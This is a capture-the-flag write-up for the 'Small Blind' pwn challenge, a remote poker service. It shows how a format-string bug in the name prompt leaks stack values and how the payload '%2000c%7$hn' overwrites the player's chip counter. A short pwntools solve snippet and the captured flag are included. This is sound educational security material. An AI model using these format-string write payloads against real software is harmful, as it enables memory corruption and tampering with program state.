# Small Blind Writeup

## Challenge

`Small Blind` is a remote pwn challenge exposed at:

```text
nc challenge.utctf.live 7255
```

The service presents a poker game with both players starting at 500 chips. The flag is gated behind a win/prize condition tied to your final chip count.

## Initial Recon

There was no local binary in the challenge directory, only the challenge description, so the service itself had to be treated as the artifact.

The first important observation was that the name prompt is reflected directly into a `printf`-style output:

```text
Enter your name:
...
Welcome to the table, <name>!
```

Supplying format specifiers in the name immediately leaked stack values:

```text
%p %p %p %p
```

This confirmed a classic format-string vulnerability in the welcome banner.

## Finding a Useful Target

Because the input length was capped, the simplest route was not a full arbitrary write with attacker-supplied addresses, but instead using existing stack arguments already passed to `printf`.

Probing stack positions showed:

- `%6$s` dereferenced to bytes corresponding to `500`
- `%7$s` dereferenced to bytes corresponding to `500`

These were the live chip counters:

- `%6$hn` writes to `dealer_chips`
- `%7$hn` writes to `your_chips`

This was verified by writing small values:

```text
%1c%6$hn  -> dealer chips became 1
%1c%7$hn  -> your chips became 1
```

## Exploit

The `%n` family writes the number of characters printed so far. Using `%2000c` pads the output count to 2000, and `%7$hn` writes that value as a 16-bit integer into `your_chips`.

Payload:

```text
%2000c%7$hn
```

After connecting:

1. Send `%2000c%7$hn` as the name.
2. The welcome banner executes the format string and sets `your_chips = 2000`.
3. Exit immediately with `n`.
4. The final prize check sees 2000 chips and prints the flag.

## Solve Script

The exploit script is in [`solve.py`](/home/al/Downloads/CTF/utctf2026/pwn/smallblind/solve.py).

Run it with:

```bash
python3 solve.py
```

Core logic:

```python
io.sendlineafter(b"Enter your name: ", b"%2000c%7$hn")
io.recvuntil(b"Play a hand?")
io.sendline(b"n")
```

## Result

Verified flag:

```text
utflag{counting_chars_not_cards}
```

## Root Cause

The program passes user-controlled input directly as the format string to `printf`, allowing stack disclosure and arbitrary writes through `%n`. In this case, one of the existing stack arguments points directly to the player chip counter, so the challenge can be solved without playing any poker at all.
